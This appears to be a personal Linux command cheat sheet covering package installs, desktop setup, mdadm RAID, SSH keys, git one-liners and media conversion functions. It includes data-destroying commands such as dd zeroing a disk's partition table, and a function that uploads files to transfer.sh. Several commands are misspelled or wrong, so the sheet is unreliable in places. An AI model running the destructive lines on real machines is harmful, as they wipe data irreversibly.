##-------------------------------------------
### AWS pem file
## https://stackoverflow.com/questions/42123317/how-to-use-a-public-keypair-pem-file-for-ansible-playbooks
## [dashboard:vars]
## ansible_ssh_private_key_file=./aws.pem
## Add aws pem file to ssh keys
$> ssh-agent bash
$> ssh-add /home/eakinc/.ssh/commandlinefun.pem
##----------------------------------------
## ############################
## ##    END  ansible
## ############################


##==========================================
## Add a new user with a home directory
$> sudo useradd -m newusername
## Add a new user with a home directory, full name and set shell to bash
$> sudo useradd -c “Full Name” -m -s /bin/bash newusername
## add a password for the user
$> sudo passwd newusername
## Add to groups, for admin sudo,adm,plugdev
$>
## OR
$> sudo vim /etc/group  ## add name to desired groups
## change default shell, add /bin/bash to end of password line corresponding to username
$> sudo cat /etc/passwd
$> sudo 's%PUTINTHELINETOCHANGE%PUTINTHELINETOCHANGE:/bin/bash%'
## OR open in editor and add :/bin/bash to end of users entry in /etc/passwd
##==========================================
## When experiencing The following signatures were invalid: BADSIG ... when refreshing the packages from the repository?
$> sudo -s -H
$> apt-get clean
$> rm /var/lib/apt/lists/*
$> rm /var/lib/apt/lists/partial/*
$> apt-get clean
$> apt-get update
##==========================================
### Install Xfce Desktop on Ubuntu Server
## Seems to not work in Virtualbox UbuntuServer18-64, error socket /run/user/1000/ connection refused, and poss $XDG_CONFIG_DIRS
## Xfce is a Fully featured lightweight desktop environment that requires less memory and processing power
## To install Xfce desktop on Ubuntu server, Run the following commands:
$> apt-get update
$> apt-get install lightdm xfce4
## After the installation is finished, Create a new file named lightdm.conf in /etc/lightdm directory:
$> sudo nano /etc/lightdm/lightdm.conf
## Add following lines to the lightdm.conf file:
$> sudo echo '
#[SeatDefaults]
#allow-guest=false
#user-session=xfce
' >> /etc/lightdm/lightdm.conf
## Remove leading #
$> sed -i 's/^#//g' /etc/lightdm/lightdm.conf
## Save the file and restart the server:
$> systemctl reboot
## When the server reboot, The Ubuntu system will start with Xfce the desktop interface.
## Install Xfce Desktop on Ubuntu Server
## Default Run Level, Switch between Graphical Interface and Command line mode
## When we install desktop on Ubuntu, the default runlevel will set to "graphical.target",
## That is why the server will start with a GUI.
## Check default runlevel
$> sudo systemctl get-default
## If you don’t want to use the Graphical User Interface, Then set the default target to multi-user.target and restart the Ubuntu server:
$> systemctl set-default multi-user.target
## Which creates a symlink;
## symlink /etc/systemd/system/default.target to /lib/systemd/system/multi-user.target
## To reverse back to booting into GUI
$> systemctl set-default graphical.target
## The system will go back to command line mode.
## It is also possible to switch between command line mode and graphical mode with systemctl command.
$> systemctl isolate graphical.target
## Will bring the graphical desktop instantly.
$> systemctl isolate graphical.target
## Will switch back to command line interface.
##==========================================
## To install LXDE on Ubuntu server, Run the following command:
$> apt-get install xorg lightdm lxde lxde-core lxsession-logout network-manager
## Add following lines to the /etc/lightdm/lightdm.conf file and restart the computer.
$> sudo echo '
$> [SeatDefaults]
$> allow-guest=false
$> user-session=LXDE
$> ' > /etc/lightdm/lightdm.conf
## Remove leading #
$> sed -i 's/^#//g' /etc/lightdm/lightdm.conf
##==========================================
## ####################################
## #      Bash Sample Scripts         #
## ####################################
##------------------------------------------
## Sample script with; var if then else elif fi
# #!/bin/bash
# echo -n "Enter a number: "
# read VAR
# if [[ $VAR -gt 10 ]]
# then
#   echo "Variable is greater than 10."
# elif [[ $VAR -eq 10 ]]
# then
#   echo "Variable is equal to 10."
# else
#   echo "Variable is less than 10."
# fi
##---------------------------------------
## Sample script with nested; var if then else fi
# #!/bin/bash
# echo -n "Enter the first number: "
# read VAR1
# echo -n "Enter the second number: "
# read VAR2
# echo -n "Enter the third number: "
# read VAR3
#
# if [[ $VAR1 -ge $VAR2 ]]
# then
#   if [[ $VAR1 -ge $VAR3 ]]
#   then
#     echo "$VAR1 is the largest number"
#   else
#     echo "$VAR3 is the largest number"
#   fi
# else
#   if [[ $VAR2 -ge $VAR3 ]]
#   then
#     echo "$VAR2 is the largest number"
#   else
#     echo "$VAR3 is the largest number"
#   fi
# fi
##==========================================
## files. Make backup while using sed on file
$> sed -i.bak '/pattern to match/d' ./infile
##==========================================
## After installing Anaconda or Miniconda, create a new conda environment containing TensorFlow and activate it
$> conda create -n tensorflow_env tensorflow
$> conda activate tensorflow_env
##==========================================
## apps. Some base packages from people on reddit
$> sudo apt-get insatll acl emacs acpi aptitude autofs build-essential cryptsetup curl daemontools debconf-utils dos2unix elfutils gawk gdb gdisk gem2deb git gpm hfsutils iotop iptables-persistent iw jq kexec-tools lshw lsof lsscsi lvm2 lynx mailutils mc mdadm memtest86+ minicom mrtg ncftp ntfs-3g ntpdate openssh-client openssh-server openssl postfix pv python-appindicator python-software-properties rfkill rpl rpm rsync runit screen sharutils software-properties-common sqlite3 syslinux-utils tcputils tig tofrodos unzip vim w3m wget whois xfsprogs
$> sudo apt-get insatll btrfs, rxvt-unicode, tmux, irssi, KeepassXC, Firefox, Libre Office, Transmission
$> sudo apt-get install gedit, inkscape, gimp, and firefox
$> sudo apt-get install mplayer, vlc, kvm, virtual machine manager, visual studio code, notepad++, dukto, qbittorrent
$> sudo apt-get install fail2ban psad linux-xanmod glances htop nmap bleachbit git python3-pip iperf3 easy-rsa iptables-persistent tuned
$> sudo apt-get install filelight, mediainfo, synaptic and tldr
$> sudo apt-get install i3 terminator elinks openssh-server git openconnect grafx2 blender tmux screen texlive-full nodejs build-essential vim inkscape gimp chromium-browser crawl-tiles wine vlc kicad puredata audacity remmina x11vnc
$> sudo apt-get install neofetch
$> sudo apt-get install ansible docker terraform vscode
$> sudo apt-get install yadm, borg-backup, ranger, kdeconnect
$> sudo apt-get install qbittorrent, smplayer, deadbeef, mc, htop, flameshot, dosbox, virtualbox, wine, gthumb, engrampa, gparted
$> sudo apt-get install tmux, htop, FreeCad, KiCad, Cura, Libre Office, qBittorrent, Deluge, Firefox, Thunderbird, Keepassxc
$> sudo apt-get install Calibre Mudlet tomboy-ng chromium-browser Tor-browser
$> sudo apt-get install feh i3wm bat keepassxc
$> sudo apt-get install zathura qbittorrent rofi dmenu
$> sudo apt-get install zsh nnn tmux fd fzf ripgrep vim openbox fluxbox nitrogen tint2 angrysearch drill-finder parallel
$> sudo apt-get install wireguard-tools mpd ncmpc newsbueter pcmanfm screen rtorrent vrms
$> sudo apt-get install urxvt fzf nnn exa bat gotop screen
### emacs hahaha
##   terminal emulator: Emacs;
##   text editor: Emacs;
##   file manager: Emacs;
##   window manager: XMonad;
##   git interface: Magit (Emacs);
##   email client: mu4e (Emacs) with mu + mbsync;
##   word/document processor: LaTeX or Org (Emacs);
##   pdf reader: Emacs;
##   image viewer: Emacs;
##   web browser: Firefox, and Eww (Emacs);
##   simple file server: Emacs Web Server;
##   emacs: Emacs.
#apt, snap, flatpack, and guix
##==========================================
## GUI. web browser
## press Ctrl+Shift+R in your browser to force a refresh of your local cache
##==========================================
### multimedia. 3d. Unity3d
## Step 1: Installing Unity3d
## To install UnityHub go to this link
https://forum.unity.com/threads/unity-hub-v2-0-beta-is-now-available-for-download.650455/
## Scroll down to download the latest version.
## after downloading right-click on the file and go to properties and then permissions and then make executable.
## now just run it and use it.
## You may need to install this additional dependency:
$> sudo apt install libgconf-2-4
## To install Unity3d without UnityHub go to this link
## Scroll down to download the latest version.
https://forum.unity.com/threads/unity-on-linux-release-notes-and-known-issues.350256/page-2
## after downloading right-click on the file and go to properties and then permissions and then make executable.
now just run it and use it.
## You may need to install this additional dependency:
$> sudo apt install libgconf-2-4
## Step 2: Installing Visual studio Code (VSCODE)
## To install VSCode go to this link
https://code.visualstudio.com/
## after installing
## go to mono project and install mono for VSCode in this link
$> firefox https://www.mono-project.com/download/vs/
$> sudo apt install mono-devel
$> sudo apt install mono-xsp4
$> sudo apt install ca-certificates-mono
$> sudo apt install referenceassemblies-pcl
$> sudo apt install mono-complete
$> sudo apt install mono-dbg
## this will fix not auto-completing in unity.
## Step 2: Adding unity3D addons in Vscode
## First downlad dotnet addon in this link
$> firefox https://dotnet.microsoft.com/download
## Second open VSCode and add these extensions that mentioned here
$> firefox https://code.visualstudio.com/docs/other/unity
## Debugger for Unity, Unity Tools, Unity Code Snippets, Unity Snippets
## Step 3: Connect Unity3D Editor to VSCode.
## open unity and go to file -> preferences and change external script editor to Browse and then go to
$> /usr/bin/code
## or
$> /usr/bin/vscode
## if you got any problems with that try
$> sudo ln -s /usr/bin/code /usr/bin/vscode in the terminal
## Step 4: Enjoy
## Now you are ready to use Unity3d without any problems
##==========================================
## web. Get Your IP Geographic Location with curl and jq
$> curl -s https://ipvigilante.com/$(curl -s https://ipinfo.io/ip) | jq '.data.latitude, .data.longitude, .data.city_name, .data.country_name'
##==========================================
## if youre looking for the directories that contain lots of files, this script may help:
$> cat countum.sh << EOF
#!/bin/bash
# count_em - count files in all subdirectories under current directory.
echo 'echo $(ls -a "$1" | wc -l) $1' >/tmp/count_em_$$
chmod 700 /tmp/count_em_$$
find . -mount -type d -print0 | xargs -0 -n1 /tmp/count_em_$$ | sort -n
rm -f /tmp/count_em_$$
EOF
##==========================================
## http://www.slashroot.in/which-is-the-fastest-method-to-delete-files-in-linux
## use RSYNC to DELETE the large number of files
$> rsync -a --delete blanktest/ test/
##==========================================
## Problem with high inode useage
## You can backup the whole filesystem, than recreate it with higher number of inodes.
## workaround I could suggest considering packing huge collections of files into an uncompressed(!) tar archive, and then using archivemount to mount it as a filesystem. A tar archive is better for sharing than a filesystem image and provides similar performance when backing up to a cloud or another storage
## zfs, btrfs and xfs dont suffer with inode issues.
### Convert ext to btrfs
$> firefox https://www.kubuntuforums.net/showthread.php/73630-Migrating-From-EXT4-to-BTRFS
## /dev/sda2 then locate the mount point and do:
$> sudo umount /mntpoint
## Then do:
$> fsck.ext4 -f /dev/sda2
$> btrfs-convert /dev/sda2
$> btrfs ## can be put on in place of ext4
##==========================================
### sysctl  - configure kernel parameters at runtime
$> firefox http://go2linux.garron.me/linux/2011/02/introduction-and-how-sysctl-linux-900/
## Display all config
$> sysctl -a
## Write kernel paramiters
$> sysctl -w net.ipv4.icmp_echo_ignore_all=1
## Set maximum number of packets, queued on the INPUT side, when the interface receives packets faster than kernel can process them.
$> echo 'net.core.netdev_max_backlog = 5000' >> /etc/sysctl.conf
## Now reload the changes:
$> sysctl -p
## Use tcpdump to view changes for eth0:
$> tcpdump -ni eth0
##==========================================
## Cool monitoring
$> firefox http://devconnected.com/monitoring-linux-logs-with-kibana-and-rsyslog/
##==========================================
### dd
## copy MBR, partition tables and boot records.
$> dd if=/dev/sda of=mbr-parttable.img bs=512 count=1
## and the other direction around when youre writing it. Polish with fdisk after.
$> dd if=mbr-parttable.img of=/dev/sda bs=512 count=1
## zero boot code, but the partition table remains intact :
$> dd if=/dev/zero of=/dev/hda bs=446 count=1
## zero everything including the partition table record.
$> dd if=/dev/zero of=/dev/hda bs=512 count=1
##==========================================
## ArUco
$> firefox https://www.youtube.com/watch?v=XjJ7ujKjQQc&list=PL7EOs-8ZXfMb2qRog9wOa3Ar-EyvRYdrp&index=2&t=0s
$> firefox http://miloq.blogspot.com/2012/12/install-aruco-ubuntu-linux.html
$> firefox http://milq.github.io/install-opencv-ubuntu-debian/
##==========================================
## os. files. Compress an exact copy of your entire Linux file system into a TAR archive.
## cd to the / directory (or root).
$> cd /
## Copy all the files
$> sudo tar -cvpzf backup.tar.gz --exclude=/backup.tar.gz --one-file-system /
## backup.tar.gz file inside the / folder and save it to an external file system.
## restore them:
$> sudo tar -xvpzf /path/to/backup.tar.gz -C /restore/location --numeric-owner
##==========================================
##==========================================
## network. share. To Stop Samba:
$> sudo service smbd stop
## or
$> sudo /etc/init.d/smbd stop
## To Start Samba:
$> sudo service smbd start
## or
$> sudo /etc/init.d/smbd start
## To remove it from rc.d file use the command
$> sudo update-rc.d -f smbd remove
## To restore it to rc.d use the command
$> sudo update-rc.d smbd defaults
##==========================================
## os. repo. deb. Compile and make a .deb
$> firefox https://help.ubuntu.com/community/CheckInstall
$> sudo apt-get update && sudo apt-get install checkinstall
## Instead of
$> sudo make install
## you will use
$> sudo checkinstall
## When called with no arguments, checkinstall will call "make install". If you need other arguments, they can be supplied:
$> sudo checkinstall make install_package
## The installed package can then also easily be removed via Synaptic or via the terminal:
$> sudo dpkg -r packagename
## Note that the .deb package it creates can also be used elsewhere, which simplifies installation of the same program on many machines.
## Use CheckInstall with auto-apt
## ## You can use auto-apt when you want to build a simple package from source with checkinstall. You need to have auto-apt installed!
## Instead of
$> ./configure
## you use:
$> auto-apt run ./configure
## If the dependencies are available, a dialog box opens and ask you to install them.
## The rest remains the same
$> make
$> sudo checkinstall
## If you add the --install=no option to checkinstall, the program will generate a .deb package without installing it. For example:
$> checkinstall --install=no
##==========================================
## network. ssh. share.  Easy way to remove ssh keys
$> firefox https://stackoverflow.com/questions/25464930/how-to-remove-a-ssh-key
## Before Remove Identity You need to start ssh-agent with this command
$> eval `ssh-agent -s`
## For Remove All Identity
$> ssh-add -D
## To Remove Specific Identity
$> ssh-add -d ~/.ssh/id_ed25519
$> ssh-add -d ~/.ssh/id_rsa
## Find a List of available Identify by using this command
$> ssh-add -l
## Add new ssh key after all delete
$> ssh-add ~/.ssh/id_ed25519
$> ssh-add ~/.ssh/id_rsa
##------------------------------
## Sign_and_send_pubkey: signing failed:
## agent refused operation when logging into several servers,
$> firefox https://stackoverflow.com/questions/25464930/how-to-remove-a-ssh-key,
## solution for me was to remove gnome-keyring, deleting identities from ssh-agent and reboot.
$> sudo apt-get autoremove gnome-keyring
$> ssh-add -D
$> chmod 600 ~/.ssh/id_rsa
## occasionally require access to the other repository which uses diff RSA key, I just dedicate one terminal for it with export
$> GIT_SSH_COMMAND="ssh -i /home/$USER/.ssh/id_rsa.pub"
## If gnome-keyring is interfereing can set ssh socks to 0.
## If this works problem is prob the key-ring saving old configs
## This worked on xps15-7590
$> SSH_AUTH_SOCK=0 ssh -v $USER@192.168.1.57
## Add key to remote server
$> cat ~/.ssh/id_rsa.pub | ssh $USER@192.168.1.57 "cat >> ~/.ssh/authorized_keys"
##==========================================
## ###############################################
## #               RAID Array                    #
## ###############################################
### RAID arrays
## RAID types raid0, raid1, raid5, raid6,  raid10 or raid1+0,
##  raid0, Striped drive, high speed
##  raid1, Striped both drives in redundant
##  raid5, Striped both drives in redundant with parity info, minimum of 3 storage devices
##  raid6, Striped both drives in redundant with double parity info to allow two drive failures, minimum of 4 storage devices
##  raid10 or raid1+0 nested array, two raid1 in a raid0
## Software raid
## Create software raid arrays with mdadm
$> firefox https://www.digitalocean.com/community/tutorials/how-to-create-raid-arrays-with-mdadm-on-ubuntu-16-04
## Has software raid
## Find the active arrays in the /proc/mdstat
$> cat /proc/mdstat
##    Personalities : [raid6] [raid5] [raid4] [linear] [multipath] [raid0] [raid1] [raid10]
##    md0 : active raid6 sdc1[1] sdd1[2] sdh1[6] sdf1[4] sde1[3] sdb1[0] sdg1[5]
##      48831521280 blocks super 1.2 level 6, 512k chunk, algorithm 2 [7/7] [UUUUUUU]
##      bitmap: 2/73 pages [8KB], 65536KB chunk
## NO software raid, has raid controller
$> cat /proc/mdstat
##    Personalities : [raid0] [linear] [multipath] [raid1] [raid6] [raid5] [raid4] [raid10]
##   md0 : active raid0 sdc[1] sdd[0]
##         209584128 blocks super 1.2 512k chunks
##    unused devices: <none>
##--------------------------------------
### Resetting Existing RAID Devices
## Unmount the array from the filesystem:
$> sudo umount /dev/md0
## Then, stop and remove the array by typing:
$> sudo mdadm --stop /dev/md0
$> sudo mdadm --remove /dev/md0
## Find out which ones were in raid
$> lsblk -o NAME,SIZE,FSTYPE,TYPE,MOUNTPOINT
## Remove the
$> sudo mdadm --zero-superblock /dev/sdc
$> sudo mdadm --zero-superblock /dev/sdd
## Comment out /dev/md0 in fstab
$> cat /etc/fstab
$> sed -i 's/whatever line/#whatever line/' /etc/fstab
## Comment out /dev/md0 in /etc/mdadm/mdadm.conf
$> cat /etc/mdadm/mdadm.conf
$> sed -i 's/whatever line/#whatever line/' /etc/mdadm/mdadm.conf
## update the initramfs
$> sudo update-initramfs -u
##--------------------------------------
### Creating a RAID 0 Array
## Find out which ones to be in raid
$> lsblk -o NAME,SIZE,FSTYPE,TYPE,MOUNTPOINT
## Create the array
$> sudo mdadm --create --verbose /dev/md0 --level=0 --raid-devices=2 /dev/sda /dev/sdb
## Check if created
$> cat /proc/mdstat
## create a filesystem on the array:
$> sudo mkfs.ext4 -F /dev/md0
## Mount
$> sudo mount /dev/md0 /home/data
## Check whether the new space is available by typing:
$> df -h -x devtmpfs -x tmpfs
## Check layout
$> sudo mdadm --detail --scan
## Save the Array Layout to /etc/mdadm/mdadm.conf
$> sudo mdadm --detail --scan | sudo tee -a /etc/mdadm/mdadm.conf
## update the initramfs, or initial RAM file system, so that the array will be available during the early boot process
$> sudo update-initramfs -u
## Add the new filesystem mount options to the /etc/fstab file for automatic mounting at boot:
$> echo '/dev/md0 /home/data ext4 defaults,nofail,discard 0 0' | sudo tee -a /etc/fstab
##--------------------------------------
### Creating a RAID 1 Array
## Find out which ones to be in raid
$> lsblk -o NAME,SIZE,FSTYPE,TYPE,MOUNTPOINT
## Create the array
## If the devices are not partitions with the boot flag enabled, it will issue warning. It is safe to type y
## mdadm tool will start to mirror the drives. This can take some time to complete, but the array can be used during this time.
$> sudo mdadm --create --verbose /dev/md0 --level=1 --raid-devices=2 /dev/sda /dev/sdb
## monitor the progress of the mirroring by checking the /proc/mdstat
$> cat /proc/mdstat
## create a filesystem on the array:
$> sudo mkfs.ext4 -F /dev/md0
## Mount
$> sudo mount /dev/md0 /home/data
## Check whether the new space is available by typing:
$> df -h -x devtmpfs -x tmpfs
## Check layout
$> sudo mdadm --detail --scan
## Save the Array Layout to /etc/mdadm/mdadm.conf
$> sudo mdadm --detail --scan | sudo tee -a /etc/mdadm/mdadm.conf
## update the initramfs, or initial RAM file system, so that the array will be available during the early boot process
$> sudo update-initramfs -u
## Add the new filesystem mount options to the /etc/fstab file for automatic mounting at boot:
$> echo '/dev/md0 /home/data ext4 defaults,nofail,discard 0 0' | sudo tee -a /etc/fstab
##--------------------------------------
## Creating a RAID 5 Array
## Find out which ones to be in raid
$> lsblk -o NAME,SIZE,FSTYPE,TYPE,MOUNTPOINT
## Create the array
## mdadm tool will use recovery process to build the array
$> sudo mdadm --create --verbose /dev/md0 --level=5 --raid-devices=3 /dev/sda /dev/sdb /dev/sdc
## monitor the progress of the mirroring by checking the /proc/mdstat
$> cat /proc/mdstat
## create a filesystem on the array:
$> sudo mkfs.ext4 -F /dev/md0
## Mount
$> sudo mount /dev/md0 /home/data
## Check whether the new space is available by typing:
$> df -h -x devtmpfs -x tmpfs
## Make SURE it is finished,
$> cat /proc/mdstat
## then create config
$> sudo mdadm --detail --scan | sudo tee -a /etc/mdadm/mdadm.conf
## update the initramfs, or initial RAM file system, so that the array will be available during the early boot process
$> sudo update-initramfs -u
## Add the new filesystem mount options to the /etc/fstab file for automatic mounting at boot:
$> echo '/dev/md0 /home/data ext4 defaults,nofail,discard 0 0' | sudo tee -a /etc/fstab
##--------------------------------------
### get detailed information about a RAID device,
$> man mdadm # -D or --detail, -Q quick view,
$> sudo mdadm -D /dev/md0        ## Info on array
$> sudo mdadm -Q /dev/sdc        ## Info on array component
$> sudo mdadm -E /dev/sdc        ## Examine component
$> cat /proc/mdstat              ## Current status
$> sudo umount /mnt/md0 && sudo mdadm --stop /dev/md0  ## Stop a RAID array
$> sudo mdadm --assemble /dev/md0                      ## Assemble an existing array in mdadm.conf
$> sudo mdadm --assemble /dev/md0 /dev/sda /dev/sdb /dev/sdc /dev/sdd && sudo mount /dev/md0 /mnt ## Assemble an existing array not in mdadm.conf
$> sudo mdadm /dev/md0 --add /dev/sde                  ## Add a device to array
##--------------------------------------
### lsi RAID pci-e card
https://www.dell.com/support/article/bz/en/bzbsdt1/sln309467/management-and-configuration-of-raid-arrays-on-lsi-megaraid-9361-8i-9440-9460-and-9341-raid-controllers?lang=en
## Card has it own bios which configures the raid
## Can poss
## During post ctl+r
## ###############################################
## ##    END RAID Array
## ###############################################
##======================================
## ###############################################
## ##    Make a table
## ###############################################
       ┌────────────────────────────────┬───────────────────────────────────────────────────┐
       │Path                            │ Description                                       │
       ├────────────────────────────────┼───────────────────────────────────────────────────┤
       │$XDG_CONFIG_HOME/systemd/user   │ Fill in the content                               │
       │                                │                                                   │
       ├────────────────────────────────┼───────────────────────────────────────────────────┤
       │/usr/lib/systemd/user           │ Units of packages that have been installed        │
       │                                │                                                   │
       └────────────────────────────────┴───────────────────────────────────────────────────┘

 ┌────────────────────────────────┬───────────────────────────────────────────────────┐
 │                                │                                                   │
 ├────────────────────────────────┼───────────────────────────────────────────────────┤
 │                                │                                                   │
 ├────────────────────────────────┼───────────────────────────────────────────────────┤
 │                                │                                                   │
 └────────────────────────────────┴───────────────────────────────────────────────────┘
## Make a box
┌──────────┐
│          │
│          │
│          │
│          │
└──────────┘

┌───────────────────────────────┐
│                               │
└───────────────────────────────┘
|
╢

╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
╟──────────────────────────────────────────────────────────────────────╢
║                                                                      ║
╟─────────────┬──────────────┬───────────┬─────────────┬───────────────╢
║             │              │           │             │               ║
╟─────────────┼──────────────┼───────────┼─────────────┼───────────────╢
║             │              │           │             │               ║
╟─────────────┼──────────────┼───────────┼─────────────┼───────────────╢
║             │              │           │             │               ║
╟─────────────┼──────────────┼───────────┼─────────────┼───────────────╢
║             │              │           │             │               ║
╟─────────────┴──────────────┴───────────┴─────────────┴───────────────╢
║                                                                      ║
╟──────────────────────────────────────────────────────────────────────╢
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝

## ###############################################
## ###############################################

##==========================================
## network. Dump network connections
## like wireshark for terminal
$> sudo tcpdump -i eth0
##==========================================
## test. Use emojis
$> firefox https://www.webfx.com/tools/emoji-cheat-sheet/
##==========================================
### files. Ways to catdog a dogdog
## echo passes string to sed
$> echo "dogdog" | sed "s/dog/cat/"
## create dogdog in file
$> echo "dogdog" > dog.txt
## sed reads string from file
$> sed "s/dog/cat/" dog.txt
## BASH passes string to sed
$> sed 's/dog/cat/' <<< "dogdog"
## BASH reads file and passes string to sed
$> sed "s/dog/cat/" < dog.txt
## All cool for diff reasons.
##==========================================
## ssh. network. Add keys to authorized_keys
$> cat ~/.ssh/id_rsa.pub | ssh username@remote_host "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"
$> cat ~/.ssh/id_rsa.pub | ssh $USER@192.168.1.57 "cat >> ~/.ssh/authorized_keys"
##==========================================
## web. Download all images from a site
## This recursively downloads all images from a given website to your /tmp directory. The -nH and -nd switches disable downloading of the directory structure.
$> wget -r -l1 --no-parent -nH -nd -P/tmp -A".gif,.jpg" http://example.com/images
##==========================================
## This will upload any file to transfer.sh and return a link you can share.
$> transfer() { if [ $# -eq 0 ]; then echo -e "No arguments specified. Usage:\necho transfer /tmp/test.md\ncat /tmp/test.md | transfer test.md"; return 1; fi
$> tmpfile=$( mktemp -t transferXXX ); if tty -s; then basefile=$(basename "$1" | sed -e 's/[^a-zA-Z0-9._-]/-/g'); curl --progress-bar --upload-file "$1" "https://transfer.sh/$basefile" >> $tmpfile; else curl --progress-bar --upload-file "-" "https://transfer.sh/$1" >> $tmpfile ; fi; cat $tmpfile; rm -f $tmpfile; }
##==========================================
## os. date. Simple popup with date and time using dmenu. I use this because I dont like having a permanent status bar.
$> echo "$(date -u '+%H:%M')\n$(date '+%Y-%m-%d')" | dmenu
##==========================================
## multimedia. video. Download Video
$> dl_music () { youtube-dl --output ~/Music/"$2.%(ext)s" --extract-audio --audio-format mp3 --audio-quality 0 "$1" --add-metadata -x ; }
##
$> function dl_music() { youtube-dl --output ~/Music/"$2.%(ext)s" --extract-audio --audio-format mp3 --audio-quality 0 "$1" --add-metadata -x ; }
## Open browser from terminal to create PR after pushing something in Git in MAC
$> git remote -v |grep origin|tail -1|awk '{print $2}'|cut -d"@" -f2|sed 's/:/\//g'|xargs -I {} open -a "Google Chrome" https://{}
##==========================================
##  multimedia. video. Download Video
$> dl_video () {
$>   youtube-dl --output ~/Videos/"$2.%(ext)s" "$1"
$> }
$> function dl_video() { youtube-dl --output ~/Videos/"$2.%(ext)s" "$1" ; }
##==========================================
##  multimedia. video.Convert Video
$> function webm2mp4() { ffmpeg -i "$1" -c:v libx264 -c:a aac -strict experimental -loglevel error "${1%%.webm}.mp4" ; }
##
$> function webm2mp3() { ffmpeg -i "$1" "${1%%.webm}.mp3" ; }
##
$> function mp42mp3() { ffmpeg -i "$1" "${1%%.mp4}.mp3" ; }
##
$> function mp42webm() { ffmpeg -i "$1" -c:v libvpx -b:v 1M -c:a libvorbis "${1%%.mp4}.webm" ; }
##
$> function domino () { ffmpeg -video_size 1064x600 -framerate 25 -f x11grab -i :0.0+428,175 domino00.mp4 ; }
##
$> function syncstats () { watch grep -e Dirty: -e Writeback: /proc/meminfo ; }
##==========================================
## Like tree command
$> find . -print | sed -e 's;[^/]*/;|-- ;g;s;-- |; |;g'
##==========================================
## Check difference between two file directories recursively
$> diff <(tree /dir/one) <(tree /dir/two)
##==========================================
## git remove files which have been deleted
## It deletes all removed files, updates what was modified, and adds new files.
$> git add -u
##==========================================
## Better tool for exporting git repository is Git itself!
$> git archive HEAD --format=zip > archive.zip
##==========================================
## List all authors of a particular git project
## List everyone who committed to a particular project, listed alphabetically. To list by commits, add -n to the shortlog. Show Sample Output
$> git shortlog -s | cut -c8-
##==========================================
## Prints per-line contribution per author for a GIT repository
## Figures out total line contribution per author for an entire GIT repo. Includes binary files, which kind of mess up the true count. If crashes or takes too long, mess with the ls-file option at the start: git ls-files -x "*pdf" -x "*psd" -x "*tif" to remove really random binary files git ls-files "*.py" "*.html" "*.css" to only include specific file types Based off my original SVN version: http://www.commandlinefu.com/commands/view/2787/prints-total-line-count-contribution-per-user-for-an-svn-repository Show Sample Output
$> git ls-files | xargs -n1 -d'\n' -i git-blame {} | perl -n -e '/\s\((.*?)\s[0-9]{4}/ && print "$1\n"' | sort -f | uniq -c -w3 | sort -r
##==========================================
## Stage only portions of the changes to a file.
$> git add --patch <filename>
##==========================================
## Generate a Google maps URL for GPS location data from digital photo
## This command uses the "exiftool" command which is available here: http://www.sno.phy.queensu.ca/~phil/exiftool/ NB, there should be a degree symbol right after the first "%d" NOT a question mark. For some unknown reason, commandlinefu is not able to handle degree symbol correctly ("?")? Show Sample Output
$> echo "https://www.google.com/maps/place/$(exiftool -ee -p '$gpslatitude, $gpslongitude' -c "%d?%d'%.2f"\" image.jpg 2> /dev/null | sed -e "s/ //g")"
##==========================================
## git. files. Show git log beautifully
## Only show a short of important information inline ( include branch info ), and color this log tree. Show Sample Output
$> git log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr)%Cblue - %cn %Creset' --abbrev-commit --date=relative
##==========================================
## git. files. Delete all local git branches that have been merged
## This checks if the branch has been merged with master and then will delete the ones that have been. Keeps your local git repo nice and clean from all the branches. Show Sample Output
$> git branch --merged | grep -v "\*" | xargs -n 1 git branch -d
##==========================================
## git. files. Better git diff, word delimited and colorized
## Define a git alias then git dcolor
$> git config alias.dcolor "diff --color-words"
##==========================================
## git. files. Git Tree Command with color and tag/branch name
$> git log --graph --oneline --all --decorate --color
##==========================================
## git. files. grep across a git repo and open matching files in gedit
$> git grep -l "your grep string" | xargs gedit
##==========================================
## git. files. List all files ever added in git repository
$> git log --name-status --oneline --all | grep -P "^[A|M|D]\s" | awk '{print $2}' | sort | uniq
##==========================================
## git. files. Pushing changes to an empty git repository for the first time
## After cloning an empty repository on the client ("git clone" just after "git init", for instance), "git push" fails. In order to be able to push to this repository for the first time, you need to run the above command. It will link your local "master" branch to the "master" branch in the origin server, and push the changes. This is only necessary only for the first push; after that, you can use just the commands "git push" or "git pull" in order to do this operations. Show Sample Output
$> git push --set-upstream origin master
##==========================================
## git. files. Create html output from colored, word-level git diff
## references: http://stackoverflow.com/questions/8818789/git-diff-word-diff-with-oneline-files use aha to output html: http://stackoverflow.com/a/20861333/199217
$> git diff --word-diff --color-words | aha > index.html && firefox index.html
##==========================================
## multimedia. video.
$> function copy2mp4() { avconv -i  "$1" -c:v copy -c:a copy "$1".mp4 ; }
## not working
$> function vid2mp4() { avconv -i  "$1" -vf format=yuv420p10le -c:v libx265 -crf 18 -preset medium -x265-params aq-mode=3:cutree=0:psy-rd=4:ipratio=1.2:pbratio=1.1:fades=1 -c:a flac -sample_fmt s16 "$1".mp4 ; }
$> function vid2mp4() { ffmpeg -i  "$1" -c:v libx265 -crf 18 -preset medium -x265-params aq-mode=3:cutree=0:psy-rd=4:ipratio=1.2:pbratio=1.1:fades=1 -c:a flac -sample_fmt s16 "$1".mp4 ; }
$> for %%f IN (*.mkv, *.mp4) do ( ffmpeg -i "%%f" -c:v libx265 -preset fast -x265-params crf=22:bframes=10:ref=6 -pix_fmt yuv420p10le -c:a libopus -b:a 192k "%%~nf_10bx265.mkv" )
## multimedia. video.
$> for %%f IN (*.mkv, *.mp4) do ( ffmpeg -i "%%f" -c:v libx265 -preset fast -x265-params crf=22:bframes=10:ref=6 -pix_fmt yuv420p10le -c:a libopus -b:a 192k "%%~nf_10bx265.mkv" )
$> function vid2mp4() { ffmpeg -i "$1" -c:v libx265 -preset fast -x265-params crf=22:bframes=10:ref=6 -pix_fmt yuv420p10le -c:a libopus -b:a 192k "$1".mp4 ; }
## Transcode video files to mp4 by changing container and reencoding. Long process. Useage: transcode2mp4 *.avi
$> function transcode2mp4() { avconv -i  "$1" -c:v libx264 -c:a mp3 "$1".mp4 ; }
##=========================================
## multimedia. video. Convert matroska mkv video files to mp4 by changing container without reencoding.
$> function mkv2mp4() { ffmpeg -i "$1" -vcodec copy -acodec copy "$1".mp4 ; }
